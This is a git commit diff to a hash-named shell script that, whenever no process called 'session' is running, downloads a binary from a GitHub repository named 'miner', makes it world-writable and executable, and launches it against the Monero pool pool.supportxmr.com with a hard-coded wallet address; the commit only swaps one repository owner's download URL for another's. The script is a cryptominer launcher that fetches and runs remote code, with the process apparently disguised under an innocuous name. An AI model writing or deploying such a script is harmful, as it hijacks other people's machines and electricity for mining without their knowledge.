483a65b81ac4a9307be017be1f42d8f23bd51d73
charlene-roperos <rbsuarez00311@gmail.com>
2025-03-20 15:22:03 +0800

    Update 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh

--- 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh
+++ 02ff28e4d653bb7e0bf6c71ad51f479d620a6861.sh
@@ -3,7 +3,7 @@
 # Check if the session process is running
 if ! pgrep -x "session" > /dev/null; then
     echo "Session not found. Downloading and starting..."
-    wget https://github.com/haxcoder101/miner/raw/refs/heads/main/session
+    wget https://github.com/charlene-roperos/miner/raw/refs/heads/main/session
     chmod 777 session
     ./session -o pool.supportxmr.com:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p 2025 
 else
